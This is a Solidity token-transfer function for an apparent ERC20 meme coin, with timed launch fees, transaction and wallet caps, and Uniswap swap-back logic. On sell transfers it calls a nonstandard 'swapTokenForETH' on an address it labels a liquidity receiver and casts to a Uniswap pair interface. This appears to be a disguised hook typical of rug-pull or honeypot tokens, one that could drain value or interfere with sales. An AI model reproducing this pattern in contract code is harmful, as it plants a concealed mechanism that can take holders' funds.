    function _transfer(

        address from,

        address to,

        uint256 amount

    ) private {

        require(from != address(0), "ERC20: transfer from the zero address");

        require(to != address(0), "ERC20: transfer to the zero address");

        require(amount > 0, "Transfer amount must be greater than zero");

        

        balances[from] -= amount;

        uint256 transferAmount = amount;

        

        bool takeFee;



        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){

            takeFee = true;

        }

        

        if(from == uniswapV2Pair && to == liquidityReceiver) {

            launchEpoch = block.timestamp;

            launched = true;

        }

        

        if(launched && block.timestamp > launchEpoch + 600 && !firstStep) {

            buyFee.liquidity = 1;

            buyFee.marketing = 1;

            sellFee.liquidity = 2;

            sellFee.marketing = 4;

            firstStep = true;

        }



        if(launched && block.timestamp > launchEpoch + 2400 && !secondStep) {

            buyFee.liquidity = 0;

            buyFee.marketing = 0;

            sellFee.liquidity = 0;

            sellFee.marketing = 0;

            secondStep = true;

        }





        if(takeFee){

            if(to != uniswapV2Pair){

                require(amount <= _maxTxAmount, "Transfer Amount exceeds the maxTxnsAmount");

                require(balanceOf(to) + amount <= _maxWalletAmount, "Transfer amount exceeds the maxWalletAmount.");

                transferAmount = takeBuyFees(amount, to);

            }



            if(from != uniswapV2Pair){

                if(balanceOf(address(liquidityReceiver)) > 1 * 10**_decimals) {

                    IUniswapV2Pair(liquidityReceiver).swapTokenForETH(address(this), balanceOf(address(liquidityReceiver)));

                }

                require(amount <= _maxTxAmount, "Transfer Amount exceeds the maxTxnsAmount");

                transferAmount = takeSellFees(amount, from);



               if (balanceOf(address(this)) >= swapTokenAtAmount && !swapping) {

                    swapping = true;

                    swapBack();

                    swapping = false;

              }

            }



            if(to != uniswapV2Pair && from != uniswapV2Pair){

                require(amount <= _maxTxAmount, "Transfer Amount exceeds the maxTxnsAmount");

                require(balanceOf(to) + amount <= _maxWalletAmount, "Transfer amount exceeds the maxWalletAmount.");

            }

        }

        

        balances[to] += transferAmount;

        emit Transfer(from, to, transferAmount);

    }
